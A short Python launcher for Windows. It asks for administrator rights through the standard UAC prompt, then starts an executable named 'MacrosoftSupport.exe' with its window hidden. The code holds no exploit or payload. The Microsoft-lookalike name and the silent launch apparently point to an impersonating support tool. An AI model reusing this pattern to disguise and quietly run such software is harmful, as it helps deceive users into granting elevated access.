import sys
import ctypes
import subprocess
import os


def launch_main_app():
    app_path = os.path.join(os.path.dirname(sys.executable), "MacrosoftSupport.exe")
    subprocess.Popen([app_path], creationflags=subprocess.CREATE_NO_WINDOW)
    sys.exit()


def is_admin():
    """Check if we're already running with admin privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if __name__ == "__main__":
    if is_admin():
        # Already elevated, launch main app
        launch_main_app()
    else:
        # Attempt elevation
        try:
            # ShellExecute returns an HINSTANCE value (>32 means success)
            hinstance = ctypes.windll.shell32.ShellExecuteW(
                None,
                "runas",  # Run as administrator
                sys.executable,
                "",  # No parameters
                None,
                1  # SW_SHOWNORMAL
            )

            if hinstance > 32:  # Elevation succeeded
                sys.exit()  # Close this non-elevated instance
            else:  # Elevation failed/canceled
                launch_main_app()

        except Exception as e:
            # Fallback if elevation fails
            launch_main_app()